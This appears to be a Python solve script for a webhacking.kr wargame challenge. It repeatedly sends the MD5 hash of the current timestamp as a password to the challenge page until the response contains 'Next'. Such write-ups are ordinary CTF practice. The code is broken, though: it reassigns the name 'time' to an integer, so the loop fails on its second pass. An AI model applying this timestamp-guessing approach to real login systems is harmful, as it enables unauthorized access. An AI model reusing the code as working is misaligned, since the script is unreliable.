import requests
import hashlib
import time

url = 'https://webhacking.kr/challenge/bonus-6/l4.php'
sess = requests.Session()

i = 1
while True:
    #print("time_test:", time.time())
    time = int(time.time()) 

    hs = hashlib.md5(str(time).encode()).hexdigest()

    param = '?password=' + hs
    new_url = url+param

    res = sess.get(new_url)
    print(str(i) + '번째')
    if('Next' in res.text):
        print(res.text)
        break
    i += 1